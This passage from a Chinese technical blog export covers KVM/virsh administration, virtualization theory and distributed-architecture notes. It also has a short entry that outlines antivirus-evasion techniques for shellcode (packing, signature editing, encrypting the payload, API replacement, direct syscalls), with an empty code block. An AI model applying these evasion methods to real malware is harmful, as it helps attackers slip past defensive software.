<li>macvtap对应的是虚拟tap设备，二层设备，可以转发到物理网卡</li>
<li>bridge对应的是虚拟tun设备，三层设备，不可以转发到物理网卡</li>
</ul>
<h2 id="2-共享剪贴板和文件"><a href="#2-共享剪贴板和文件" class="headerlink" title="2. 共享剪贴板和文件"></a>2. 共享剪贴板和文件</h2><h3 id="2-1-linux-host-windows-guest"><a href="#2-1-linux-host-windows-guest" class="headerlink" title="2.1. linux(host) &#x3D;&gt; windows(guest)"></a>2.1. linux(host) &#x3D;&gt; windows(guest)</h3><h4 id="剪贴板"><a href="#剪贴板" class="headerlink" title="剪贴板"></a>剪贴板</h4><ul>
<li>windows安装 <a href="https://www.spice-space.org/download/windows/spice-guest-tools/spice-guest-tools-latest.exe">https://www.spice-space.org/download/windows/spice-guest-tools/spice-guest-tools-latest.exe</a></li>
<li>配置一个channel<ul>
<li>Device type: spicevmc</li>
<li>Target type: virtio</li>
<li>Target name: com.redhat.spice.0</li>
</ul>
</li>
<li>然后文字类型剪贴板就可以共享了</li>
</ul>
<h4 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h4><ul>
<li>windows <a href="https://www.spice-space.org/download/windows/spice-webdavd/spice-webdavd-x86-latest.msi">https://www.spice-space.org/download/windows/spice-webdavd/spice-webdavd-x86-latest.msi</a></li>
<li>安装好之后启动<code>spice webdav proxy</code>服务</li>
<li>然后在virt-manager里面添加channel<ul>
<li>Device type: spiceport</li>
<li>Target type: virtio</li>
<li>Target name: org.spice-space.webdav.0</li>
</ul>
</li>
<li>这时已经可以拖拽文件到虚拟机，会自动拷贝到桌面</li>
<li>要拷贝文件出来需要使用<code>remote viewer</code>连接<code>127.0.0.1:5900</code>（由virt-manager的Display Spice配置的）</li>
<li>然后选择<code>文件 =&gt; preferences</code>里面配置即可，会映射外部为一个网络驱动设备</li>
</ul>
<h3 id="2-2-linux-host-linux-guest"><a href="#2-2-linux-host-linux-guest" class="headerlink" title="2.2. linux(host) &#x3D;&gt; linux(guest)"></a>2.2. linux(host) &#x3D;&gt; linux(guest)</h3><ul>
<li>剪贴板: <code>qemu-guest-agent</code>，对应需要启动服务<code>qemu-guest-agent</code></li>
<li>文件共享: <code>spice-vdagent</code>，对应需要启动服务<code>spice-vdagent</code></li>
</ul>
<h1 id="四、qemu管理控制台命令"><a href="#四、qemu管理控制台命令" class="headerlink" title="四、qemu管理控制台命令"></a>四、qemu管理控制台命令</h1><h2 id="1-快照"><a href="#1-快照" class="headerlink" title="1. 快照"></a>1. 快照</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">savevm [tag|id] # 保存一个快照</span><br></pre></td></tr></table></figure>

<h1 id="五、virsh-命令"><a href="#五、virsh-命令" class="headerlink" title="五、virsh 命令"></a>五、virsh 命令</h1><ul>
<li>virsh依赖libvirt，管理的是libvirt中注册的虚拟机</li>
</ul>
<h2 id="1-虚拟机管理"><a href="#1-虚拟机管理" class="headerlink" title="1. 虚拟机管理"></a>1. 虚拟机管理</h2><h3 id="1-1-常用命令"><a href="#1-1-常用命令" class="headerlink" title="1.1. 常用命令"></a>1.1. 常用命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列举所有的虚拟机</span></span><br><span class="line">=&gt; virsh list --all</span><br><span class="line"> Id   Name    State</span><br><span class="line">------------------------</span><br><span class="line"> 13   win10   running</span><br><span class="line"> -    vm1     shut off</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除一个虚拟机，下面命令只是删除了配置文件，磁盘文件还没有清理</span></span><br><span class="line">virsh undefine [guest_name]</span><br></pre></td></tr></table></figure>

<h3 id="1-2-单虚拟机操作"><a href="#1-2-单虚拟机操作" class="headerlink" title="1.2. 单虚拟机操作"></a>1.2. 单虚拟机操作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 电源操作 ##########</span></span></span><br><span class="line">virsh start [guest_name]        # 开机</span><br><span class="line">virsh shutdown [guest_name]     # 关机</span><br><span class="line">virsh suspend [guest_name]      # 挂起</span><br><span class="line">virsh resume [guest_name]       # 恢复</span><br><span class="line">virsh destroy [guest_name]      # 强制关机</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 信息查看 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看硬盘信息</span></span><br><span class="line">=&gt; virsh domblklist win10</span><br><span class="line"> Target   Source</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"> sda      /path/to/win10-kvm/win10.qcow2</span><br></pre></td></tr></table></figure>

<h2 id="2-快照管理"><a href="#2-快照管理" class="headerlink" title="2. 快照管理"></a>2. 快照管理</h2><p>参考 <a href="https://www.cnblogs.com/jython/p/4301954.html">什么是虚拟机快照链(snapshot chains)</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看快照</span></span><br><span class="line">virsh snapshot-list [guest_name]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看一个快照具体信息</span></span><br><span class="line">virsh snapshot-info [guest_name] [ss_name]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">保存内置快照，关机就是磁盘快照（较快），开机就是内存快照（较慢）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置文件保存在 /var/lib/libvirt/qemu/snapshot/[guest_name]/[ss_name].xml</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">内置快照的内容保存在磁盘文件中</span></span><br><span class="line">virsh snapshot-create-as [guest_name] [ss_name]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除快照</span></span><br><span class="line">virsh snapshot-delete [guest_name] [ss_name]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">恢复快照</span></span><br><span class="line">virsh snapshot-revert [guest_name] [ss_name]</span><br></pre></td></tr></table></figure>

<h1 id="五、libvirt"><a href="#五、libvirt" class="headerlink" title="五、libvirt"></a>五、libvirt</h1><h2 id="1-配置文件位置"><a href="#1-配置文件位置" class="headerlink" title="1. 配置文件位置"></a>1. 配置文件位置</h2><ul>
<li>管理的虚拟机配置文件: <code>/etc/libvirt/qemu/</code></li>
<li>快照配置文件: <code>/var/lib/libvirt/qemu/snapshot/</code></li>
</ul>
<h1 id="六、读书笔记"><a href="#六、读书笔记" class="headerlink" title="六、读书笔记"></a>六、读书笔记</h1><h2 id="1-《kvm实战：原理、进阶与性能调优》"><a href="#1-《kvm实战：原理、进阶与性能调优》" class="headerlink" title="1. 《kvm实战：原理、进阶与性能调优》"></a>1. 《kvm实战：原理、进阶与性能调优》</h2><h3 id="1-1-虚拟化简介"><a href="#1-1-虚拟化简介" class="headerlink" title="1.1. 虚拟化简介"></a>1.1. 虚拟化简介</h3><h4 id="1-云计算概述"><a href="#1-云计算概述" class="headerlink" title="1) 云计算概述"></a>1) 云计算概述</h4><p>云计算分为下面几种服务类型</p>
<ul>
<li>IaaS（Infrastructure as a Service，基础架构即服务）: 云服务提供一个虚拟硬件环境，用户自己安装操作系统，如虚拟机</li>
<li>PaaS（PlatForm as a Service，平台即服务）: 云服务提供软件运行环境，用户不控制操作系统，只维护程序，如docker</li>
<li>SaaS（Software as a Service，软件即服务）: 云服务提供软件，用户直接使用软件，如docs软件</li>
</ul>
<img src="2023-02-06-01.png" />

<h4 id="2-虚拟化技术"><a href="#2-虚拟化技术" class="headerlink" title="2) 虚拟化技术"></a>2) 虚拟化技术</h4><h5 id="软件虚拟化和硬件虚拟化"><a href="#软件虚拟化和硬件虚拟化" class="headerlink" title="软件虚拟化和硬件虚拟化"></a>软件虚拟化和硬件虚拟化</h5><ul>
<li>软件虚拟化: 纯软件模拟硬件，直接二进制翻译，优势是可以模拟所有平台，缺点是慢</li>
<li>硬件虚拟化: 计算机硬件本身提供能力让客户机执行指令，客户机运行在<code>non-root mode</code>，VMM运行在<code>root mode</code>，性能提升，如intel VT（Intel Virtualization Technology）</li>
</ul>
<h5 id="半虚拟化和全虚拟化"><a href="#半虚拟化和全虚拟化" class="headerlink" title="半虚拟化和全虚拟化"></a>半虚拟化和全虚拟化</h5><ul>
<li>半虚拟化: 客户机知道自己是虚拟机，某些指令和操作自己处理。简化VMM复杂度和硬件依赖，典型的是virtio，需要两端都装上驱动</li>
<li>全虚拟化: 客户机不知道自己是虚拟机，完全由VMM进行模拟。</li>
<li>intel VT出现前，半虚拟化性能较高，出现后全虚拟化性能直线上升</li>
</ul>
<h5 id="Type1和Type2虚拟化"><a href="#Type1和Type2虚拟化" class="headerlink" title="Type1和Type2虚拟化"></a>Type1和Type2虚拟化</h5><ul>
<li>Type1: 没有宿主机，虚拟化层直接运行在硬件上，直接控制硬件。如Xen和VMware ESX</li>
<li>Type2: 软件形式运行在宿主机上，如VMware Workstation</li>
<li>kvm是基于linux内核上，可以说是直接运行在硬件上，但是硬件管理由内核处理，归为Type2</li>
</ul>
<h4 id="3-KVM简介"><a href="#3-KVM简介" class="headerlink" title="3) KVM简介"></a>3) KVM简介</h4><img src="2023-02-06-02.png" />

<ul>
<li>kvm设计初衷就是基于硬件虚拟化技术实现的，所以kvm必须运行在<code>intel VT</code>等类似环境上</li>
</ul>
<h4 id="4-其他虚拟化解决方案"><a href="#4-其他虚拟化解决方案" class="headerlink" title="4) 其他虚拟化解决方案"></a>4) 其他虚拟化解决方案</h4><h5 id="Xen"><a href="#Xen" class="headerlink" title="Xen"></a>Xen</h5><ul>
<li>开源</li>
<li>没有宿主机概念，直接运行在硬件上，用户通过0号虚拟机进行管理</li>
</ul>
<img src="2023-02-06-03.png" />

<h5 id="VMware"><a href="#VMware" class="headerlink" title="VMware"></a>VMware</h5><ul>
<li>VMware Workstation: Type2虚拟化</li>
<li>VMware ESXi: Type1虚拟化，类似于Xen</li>
</ul>
<h5 id="HyperV"><a href="#HyperV" class="headerlink" title="HyperV"></a>HyperV</h5><ul>
<li>闭源，微软退出，类似于Xen，为Type1虚拟化</li>
</ul>
<img src="2023-02-06-04.png" />

<h5 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h5><ul>
<li>依托于linux内核的cgroup和namespace等机制</li>
<li>如docker和LXC等，和宿主机公用内核，轻量级，适用于PaaS</li>
</ul>
<h3 id="1-2-KVM原理简介"><a href="#1-2-KVM原理简介" class="headerlink" title="1.2. KVM原理简介"></a>1.2. KVM原理简介</h3><h4 id="1-硬件虚拟化"><a href="#1-硬件虚拟化" class="headerlink" title="1) 硬件虚拟化"></a>1) 硬件虚拟化</h4><h5 id="cpu虚拟化"><a href="#cpu虚拟化" class="headerlink" title="cpu虚拟化"></a>cpu虚拟化</h5><p><strong>intel</strong></p>
<ul>
<li>intel最早支持硬件cpu虚拟化，也就是intel VT，处理器级别称为VMX（virtual-machine extensions）</li>
<li>有两种VMX模式，根操作（root operation）和非根操作（non-root operation）</li>
<li>KVM和宿主机都是运行在根操作下，客户机都是在非根操作下</li>
<li>部分指令会导致从客户机的非根模式到根模式下，即VM Exit；进入非根模式为VM Entry</li>
</ul>
<img src="2023-02-07-05.png" />

<ul>
<li>逻辑处理器在根模式和非根模式下切换通过一个VMCS（virtual-machine control data structure）的数据结构控制，访问它需要用指针</li>
<li>VMCS指针指向一个VMCS结构的64位指针，使用VMPTRST和VMPTRLD指令对VMCS指针进行读写，使用MREAD、VMWRITE和VMCLEAR等指令进行设置</li>
<li>一个逻辑处理器可以维护多个VMCS结构，但某个时刻只有一个生效，使用VMPTRLD让某个指针生效</li>
<li>可能会导致VM Exit的事件：一些异常、三次故障（Triple fault），外部终端，不可屏蔽中断（NMI）、INIT信号、系统管理终端（SMI）等</li>
<li>VM Exit的代价比较高，可能会消耗成千上百个CPU执行周期，所以是性能分析和调优的关键点</li>
</ul>
<h5 id="内存虚拟化"><a href="#内存虚拟化" class="headerlink" title="内存虚拟化"></a>内存虚拟化</h5><ul>
<li>客户机虚拟地址，GVA（Guest Virtual Address）</li>
<li>客户机物理地址，GPA（Guest Physical Address）</li>
<li>宿主机虚拟地址，HVA（Host Virtual Address）</li>
<li>宿主机物理地址，HPA（Host Physical Address）</li>
</ul>
<img src="2023-02-07-06.png" />

<ul>
<li>程序从虚拟地址到物理地址的转换需要使用CR3寄存器，但是在虚拟环境下只能转化成虚拟主机的物理地址，并非HPA，所以需要一个影子页表将GPA转化成HPA</li>
<li>软件实现影子页表开销较大，而intel的cpu在设计上引入了EPT（Extended Page Table，扩展页表）</li>
<li>EPT只有在非根模式下才会参与内存地址转换</li>
<li>在非根模式下，cpu找CR3执行INVLPG指令不会导致VM Exit，并且客户机上页表结构故障也不会导致VM Exit</li>
</ul>
<p><strong>VPID</strong></p>
<ul>
<li>由于EPT扩展页表让不同虚拟机中的映射是不一样的，如果切换了运行环境，TLB也是不一样的，所以虚拟机切换都需要刷新TLB，让TLB重新进行缓存，这样效率比较低</li>
<li>intel在内存虚拟化引入了VPID（Virtual-processor identifier），用于在硬件级对TLB进行优化</li>
<li>虚拟机执行控制器的<code>enable VPID</code>比特位被置为1时，当前的VPID的值是VMCS中的VPID执行控制域的值，cpu找TLB就会查找对应VPID的TLB</li>
</ul>
<h5 id="I-O虚拟化"><a href="#I-O虚拟化" class="headerlink" title="I&#x2F;O虚拟化"></a>I&#x2F;O虚拟化</h5><p>常见的虚拟化方式有下面四种</p>
<ol>
<li>设备模拟：在VMM中模拟传统IO设备，客户机执行对应的IO请求由VMM进行捕获执行并返回</li>
<li>前后端驱动接口：在VMM和客户机之间定义一套交互接口，如virtio</li>
<li>设备直接分配：将一个物理设备直接分给客户机使用，如Intel VT-d（Virtualization Technology For Directed I&#x2F;O）</li>
<li>设备共享分配：特定物理设备可以支持多个虚拟机接口功能，可以给不同客户机使用，如SR-IOV（Single Root I&#x2F;O Virtualization and Sharing）规范设备</li>
</ol>
<p>优缺点</p>
<table>
<thead>
<tr>
<th></th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody><tr>
<td>设备模拟</td>
<td>兼容性好，不需要额外驱动</td>
<td>1. 性能较差<br>2. 模拟设备的功能特性支持不多</td>
</tr>
<tr>
<td>前后端接口</td>
<td>性能有所提升</td>
<td>1. 兼容性差，需要客户机安装驱动<br>2. IO压力大时，后端驱动的CPU占用高</td>
</tr>
<tr>
<td>设备直接分配</td>
<td>性能非常好</td>
<td>1. 需要硬件设备支持<br>2. 只能分配给一个机器<br>3. 很难动态迁移</td>
</tr>
<tr>
<td>设备共享分配</td>
<td>性能非常好<br>可以共享</td>
<td>1. 需要设备硬件支持<br>2. 很难动态迁移</td>
</tr>
</tbody></table>
<h5 id="Intel虚拟化技术发展"><a href="#Intel虚拟化技术发展" class="headerlink" title="Intel虚拟化技术发展"></a>Intel虚拟化技术发展</h5><ol>
<li>VT-x技术：intel处理器的虚拟化支持，包括VMX、EPT、VPID等技术</li>
<li>VT-d技术：Intel的芯片组的虚拟化支持，通过Intel IOMMU实现对设备的直接分配<ul>
<li>为VMM提供了：I&#x2F;O设备分配、DMA重定向、终端重定向、中断投递等</li>
</ul>
</li>
<li>VT-c技术：Intel的I&#x2F;O设备的虚拟化技术，包含虚拟机设备队列（VMDq）最大限度提高I&#x2F;O吞吐率，虚拟机直接互联（VMDc）大幅提升虚拟化性能</li>
</ol>
<h4 id="2-KVM架构概述"><a href="#2-KVM架构概述" class="headerlink" title="2) KVM架构概述"></a>2) KVM架构概述</h4><ul>
<li>KVM是基于硬件虚拟化支持的完全虚拟化技术，可以虚拟化几乎所有的操作系统</li>
</ul>
<img src="2023-02-07-07.png" />

<h4 id="3-KVM内核模块"><a href="#3-KVM内核模块" class="headerlink" title="3) KVM内核模块"></a>3) KVM内核模块</h4><ul>
<li>kvm是作为一个模块加载到内核中的，可以使用lsmod查看</li>
<li>硬件无关部分为kvm，和cpu相关的部分如intel的为kvm_intel</li>
<li>加载了kvm模块后，会在启动后执行VMXON将宿主机变成虚拟化模式的根模式，创建<code>/dev/kvm</code>设备文件</li>
<li>然后使用loctl对<code>/dev/kvm</code>进行操作</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>shellcode相关笔记</title>
    <url>/blogs/2023-01-02-shellcode/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>参考 <a href="https://www.freebuf.com/articles/endpoint/323789.html">初探shellcode免杀</a></p>
<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>shellcode是用于利用软件漏洞而执行的代码，一般是机器码，由于作用一般是让攻击者获得shell而得名。由于是机器码，在寄存器eip溢出后，塞入机器码来执行。</p>
<h2 id="2-基础知识"><a href="#2-基础知识" class="headerlink" title="2. 基础知识"></a>2. 基础知识</h2><h3 id="2-1-eip寄存器"><a href="#2-1-eip寄存器" class="headerlink" title="2.1. eip寄存器"></a>2.1. eip寄存器</h3><p>存放cpu下次要执行的指令地址，只需要修改eip寄存器的值，即可执行shellcode。</p>
<h2 id="3-免杀"><a href="#3-免杀" class="headerlink" title="3. 免杀"></a>3. 免杀</h2><h3 id="3-1-杀软原理"><a href="#3-1-杀软原理" class="headerlink" title="3.1. 杀软原理"></a>3.1. 杀软原理</h3><p>目前的杀软手段一般由两种</p>
<ol>
<li>基于特征</li>
<li>基于行为</li>
</ol>
<p>云查杀本质基于特征查杀；沙箱则需要做反沙箱</p>
<h4 id="1-基于特征"><a href="#1-基于特征" class="headerlink" title="1) 基于特征"></a>1) 基于特征</h4><p>杀软一般会定义一个阈值，当文件内部的特征数量达到一定程度就会判断为恶意程序。一般判断文件的md5、sha1hash、匹配文件中的字符串、程序入口点、IAT导入表等。查杀依赖厂商的病毒库更新</p>
<h4 id="2-基于行为"><a href="#2-基于行为" class="headerlink" title="2) 基于行为"></a>2) 基于行为</h4><p>对多个系统api进行hook，如：注册表操作、添加启动项、添加服务、添加用户、注入、创建进程、创建线程、加载DLL等。除了hookapi还会对api调用链进行监控，如申请内存，将shellcode加载进内存，再执行内存区域的shellcode</p>
<h3 id="3-2-如何进行免杀"><a href="#3-2-如何进行免杀" class="headerlink" title="3.2. 如何进行免杀"></a>3.2. 如何进行免杀</h3><h4 id="1-静态免杀"><a href="#1-静态免杀" class="headerlink" title="1) 静态免杀"></a>1) 静态免杀</h4><p>加壳改壳、添加&#x2F;替换资源文件、修改特征码、加密shellcode等。</p>
<p>加密的方式有很多，直接使用aes、des、xor、base64、hex等方法进行加密或字写加密，将shellcode的特征去除即可</p>
<h4 id="2-行为免杀"><a href="#2-行为免杀" class="headerlink" title="2) 行为免杀"></a>2) 行为免杀</h4><p>一般使用api替换、直接系统调用、替换操作方式采用白加黑的手段</p>
<h1 id="二、windows"><a href="#二、windows" class="headerlink" title="二、windows"></a>二、windows</h1><h2 id="1-示例"><a href="#1-示例" class="headerlink" title="1. 示例"></a>1. 示例</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Common</category>
      </categories>
  </entry>
  <entry>
    <title>架构师相关知识</title>
    <url>/blogs/2022-12-28-architect/</url>
    <content><![CDATA[<h1 id="一、大型架构演进"><a href="#一、大型架构演进" class="headerlink" title="一、大型架构演进"></a>一、大型架构演进</h1><h2 id="1-系统处理能力提升途径"><a href="#1-系统处理能力提升途径" class="headerlink" title="1. 系统处理能力提升途径"></a>1. 系统处理能力提升途径</h2><table>
<thead>
<tr>
<th></th>
<th>垂直伸缩</th>
<th>水平伸缩</th>
</tr>
</thead>
<tbody><tr>
<td>伸缩途径</td>
<td>单机性能提升</td>
<td>增加机器组建集群</td>
</tr>
<tr>
<td>行业</td>
<td>传统行业，如银行</td>
<td>互联网行业</td>
</tr>
<tr>
<td>成本</td>
<td>增加处理能力到某个程度后，会需要更多的钱来进行更高的提升</td>
<td>增加服务器的成本为线性的</td>
</tr>
<tr>
<td>极限</td>
<td>物理处理存在极限<br>操作系统或应用程序处理存在极限</td>
<td>增加服务器就可以提升性能<br>应用程序和系统在不同服务器运行，不会达到极限</td>
</tr>
</tbody></table>
<h2 id="2-架构演进"><a href="#2-架构演进" class="headerlink" title="2. 架构演进"></a>2. 架构演进</h2><table>
<thead>
<tr>
<th>用户数</th>
<th>方案</th>
<th>解决瓶颈</th>
</tr>
</thead>
<tbody><tr>
<td>少量</td>
<td>单机系统处理</td>
<td></td>
</tr>
<tr>
<td>万级</td>
<td>使用数据库处理数据，应用读取数据库</td>
<td>应用处理瓶颈</td>
</tr>
<tr>
<td>十万级</td>
<td>需要增加缓存改善，应用服务分布式集群</td>
<td>单应用处理瓶颈</td>
</tr>
<tr>
<td>百万级</td>
<td>使用cdn和反向代理进行加速响应<br>数据库进行读写分离</td>
<td>数据库处理速度，减少静态资源处理消耗</td>
</tr>
<tr>
<td>千万级</td>
<td>分布式文件系统，分布式数据库系统</td>
<td>文件系统和数据库处理瓶颈</td>
</tr>
<tr>
<td>亿级</td>
<td>使用搜索引擎、NoSQL、消息队列与分布式服务</td>
<td>业务增加的复杂度</td>
</tr>
</tbody></table>
<ul>
<li>数据库应用分离</li>
<li><a href="/blogs/2022-11-27-cache.md">缓存</a>改进性能</li>
<li>应用服务集群，使用负载均衡调度到不同的应用服务器</li>
<li>数据库读写分离</li>
<li>反向代理和CDN加速响应</li>
<li>分布式文件系统和分布式数据库系统</li>
<li>使用消息队列与分布式服务</li>
</ul>
<h1 id="二、数据库"><a href="#二、数据库" class="headerlink" title="二、数据库"></a>二、数据库</h1><h2 id="1-数据库读写分离"><a href="#1-数据库读写分离" class="headerlink" title="1. 数据库读写分离"></a>1. 数据库读写分离</h2><ul>
<li>读操作和写操作对应不同场景，写操作更耗费性能</li>
<li>将写操作写入主服务器，通过复制的方式到读数据库，加快读数据的响应速度</li>
</ul>
<h2 id="2-mysql"><a href="#2-mysql" class="headerlink" title="2. mysql"></a>2. mysql</h2><h3 id="2-1-备份方案"><a href="#2-1-备份方案" class="headerlink" title="2.1. 备份方案"></a>2.1. 备份方案</h3><p>参考 <a href="https://www.pcwdld.com/best-mysql-backup-tools#wbounce-modal">9 Best MySQL Backup Tools</a></p>
<ul>
<li>物理备份：二进制文件拷贝，需要重启mysql但是耗时很短，不锁表，占用空间较大，percona开源<ul>
<li>首次物理备份后可以通过增量拉取变更数据（基于LSN计算偏移量）</li>
<li>备份需要读取mysql的binlog，只能在对应机器执行，不能ip+端口远程执行</li>
</ul>
</li>
<li>逻辑备份：基于sql脚本，占用空间小，但是会锁表，不需要重启mysql，官方自带</li>
</ul>
<h1 id="三、CDN和反向代理"><a href="#三、CDN和反向代理" class="headerlink" title="三、CDN和反向代理"></a>三、CDN和反向代理</h1><h2 id="1-使用场景"><a href="#1-使用场景" class="headerlink" title="1. 使用场景"></a>1. 使用场景</h2><ul>
<li>一般对于静态资源放到cdn服务器上，不会到应用处理服务器上</li>
</ul>
<h1 id="四、分布式消息队列"><a href="#四、分布式消息队列" class="headerlink" title="四、分布式消息队列"></a>四、分布式消息队列</h1><h1 id="五、本地集群和分布式集群"><a href="#五、本地集群和分布式集群" class="headerlink" title="五、本地集群和分布式集群"></a>五、本地集群和分布式集群</h1><h2 id="1-本地集群"><a href="#1-本地集群" class="headerlink" title="1. 本地集群"></a>1. 本地集群</h2><ul>
<li>本地集群是指由多台计算机组成的集群，这些计算机通常位于同一地理位置，通过局域网或高速网络连接在一起。本地集群通常用于处理大量数据或执行计算密集型任务，例如科学计算、数据分析和机器学习等</li>
<li>在互联网场景下，本地集群可以认为是一台高性能设备</li>
</ul>
<h3 id="1-1-本地集群的模式"><a href="#1-1-本地集群的模式" class="headerlink" title="1.1. 本地集群的模式"></a>1.1. 本地集群的模式</h3><ul>
<li>主从集群是由一个主节点和多个从节点组成的集群，主节点负责处理所有的写操作，从节点则负责复制主节点的数据并处理读操作。主节点和从节点之间通过数据同步机制保持数据的一致性。当主节点发生故障时，从节点中的一个会被选举为新的主节点，继续处理写操作。</li>
<li>主备集群是由一个主节点和一个备节点组成的集群，主节点负责处理所有的写操作，备节点则负责复制主节点的数据。当主节点发生故障时，备节点会接管主节点的工作，成为新的主节点。与主从集群不同的是，主备集群只有一个备节点，因此在备节点接管主节点工作的过程中，可能会出现一段时间的数据不一致。</li>
</ul>
<h3 id="1-2-主从集群"><a href="#1-2-主从集群" class="headerlink" title="1.2. 主从集群"></a>1.2. 主从集群</h3><p>所有节点参与分发，主节点关注写操作，其他节点均只有读操作，写操作从主节点复制过来</p>
<h4 id="1-集群分发模式"><a href="#1-集群分发模式" class="headerlink" title="1) 集群分发模式"></a>1) 集群分发模式</h4><h5 id="NAT-网络层处理"><a href="#NAT-网络层处理" class="headerlink" title="NAT 网络层处理"></a>NAT 网络层处理</h5><ul>
<li>主节点将用户请求的数据包的目的地址修改为从节点，转发给从节点</li>
<li>从节点处理完后，返还给主节点，主节点再将源ip改为集群ip发出去</li>
<li>三层代理</li>
</ul>
<h5 id="DR-数据链路层处理"><a href="#DR-数据链路层处理" class="headerlink" title="DR 数据链路层处理"></a>DR 数据链路层处理</h5><ul>
<li>主节点将用户请求的数据包的目的mac地址修改为从节点，发给从节点</li>
<li>从节点处理后，将数据包以集群ip为源地址直接发出去</li>
<li>二层代理</li>
</ul>
<h3 id="1-3-主备集群"><a href="#1-3-主备集群" class="headerlink" title="1.3. 主备集群"></a>1.3. 主备集群</h3><h2 id="2-分布式集群"><a href="#2-分布式集群" class="headerlink" title="2. 分布式集群"></a>2. 分布式集群</h2><ul>
<li>分布式集群是指由多台计算机组成的集群，这些计算机通常位于不同的地理位置，通过互联网或其他网络连接在一起。分布式集群通常用于处理大规模的数据和任务，例如大规模网站、分布式数据库和分布式文件系统等</li>
<li>互联网场景下，分布式集群是多个不同地理位置的设备共同提供服务</li>
</ul>
<h1 id="六、性能优化"><a href="#六、性能优化" class="headerlink" title="六、性能优化"></a>六、性能优化</h1><h2 id="1-限流"><a href="#1-限流" class="headerlink" title="1. 限流"></a>1. 限流</h2><h3 id="1-1-并发连接数"><a href="#1-1-并发连接数" class="headerlink" title="1.1. 并发连接数"></a>1.1. 并发连接数</h3><ul>
<li>同一时间的连接总数上限</li>
<li>可能会因为某些请求的处理时间较长而导致限流</li>
</ul>
<h4 id="1-限流报错排查"><a href="#1-限流报错排查" class="headerlink" title="1) 限流报错排查"></a>1) 限流报错排查</h4><ul>
<li>一般看处理日志，是否某些请求的处理卡住超时</li>
</ul>
<h3 id="1-2-新建连接数"><a href="#1-2-新建连接数" class="headerlink" title="1.2. 新建连接数"></a>1.2. 新建连接数</h3><ul>
<li>每秒新建总数上限</li>
</ul>
<h4 id="1-限流报错排查-1"><a href="#1-限流报错排查-1" class="headerlink" title="1) 限流报错排查"></a>1) 限流报错排查</h4><ul>
<li>这种一般是下发了事件后，同一时间客户端的请求数量过大，一般做客户端请求离散化或服务端下发事件离散化处理即可</li>
</ul>
<h1 id="七、数据密集型应用系统设计"><a href="#七、数据密集型应用系统设计" class="headerlink" title="七、数据密集型应用系统设计"></a>七、数据密集型应用系统设计</h1><p>参考书本《数据密集型应用系统设计》</p>
<h2 id="第一部分-数据系统基础"><a href="#第一部分-数据系统基础" class="headerlink" title="第一部分 数据系统基础"></a>第一部分 数据系统基础</h2><h3 id="1-可靠、可拓展与可维护的应用系统"><a href="#1-可靠、可拓展与可维护的应用系统" class="headerlink" title="1. 可靠、可拓展与可维护的应用系统"></a>1. 可靠、可拓展与可维护的应用系统</h3><h4 id="1-1-可靠性"><a href="#1-1-可靠性" class="headerlink" title="1.1. 可靠性"></a>1.1. 可靠性</h4><ul>
<li>用户期望的功能实现</li>
<li>容忍用户错误或不正确的使用方法</li>
<li>性能可以应对的典型场景、压力和数据量</li>
<li>系统可以防止未经授权的访问和滥用</li>
</ul>
<h4 id="1-2-可扩展性"><a href="#1-2-可扩展性" class="headerlink" title="1.2. 可扩展性"></a>1.2. 可扩展性</h4><p><strong>负载描述</strong></p>
<ul>
<li>qps（queries Per Second）</li>
</ul>
<p><strong>性能描述</strong></p>
<ul>
<li>百分位数：类似于中位数，不过是按照百分比计算的中位数</li>
<li>关注的百分位数一般有95%、99%、99.9%</li>
</ul>
<h4 id="1-3-可维护性"><a href="#1-3-可维护性" class="headerlink" title="1.3. 可维护性"></a>1.3. 可维护性</h4><p><strong>运营</strong></p>
<ul>
<li>监视系统健康状况，出现异常快速恢复</li>
<li>追踪问题原因，如系统故障和性能下降</li>
<li>保持软件和平台到最新状态，如安全补丁</li>
<li>避免执行破坏性操作</li>
<li>预测未来可能的问题，如容量不足</li>
<li>建立用于部署、配置管理等实践规范和工具包</li>
<li>执行复杂的维护任务，如迁移</li>
<li>配置更改，维护系统安全稳定</li>
<li>指定流程规范操作行为</li>
<li>传承相关知识</li>
</ul>
<p><strong>系统设计考虑点</strong></p>
<ul>
<li>提供系统运行时行为和内部的观测性，方便监控</li>
<li>自动化标准工具集成</li>
<li>避免特定机器绑定，允许整体运行完整的同时，部分机器停机维护</li>
<li>文档和操作模式良好</li>
<li>默认配置良好</li>
<li>尝试自我修复，并允许管理员手动控制状态</li>
<li>预测可能出现的意外进行处理</li>
</ul>
<p><strong>简单化</strong></p>
<ul>
<li>后续人员好维护</li>
</ul>
<p><strong>可演化</strong></p>
<ul>
<li>应对需求改变的解决方案考虑</li>
</ul>
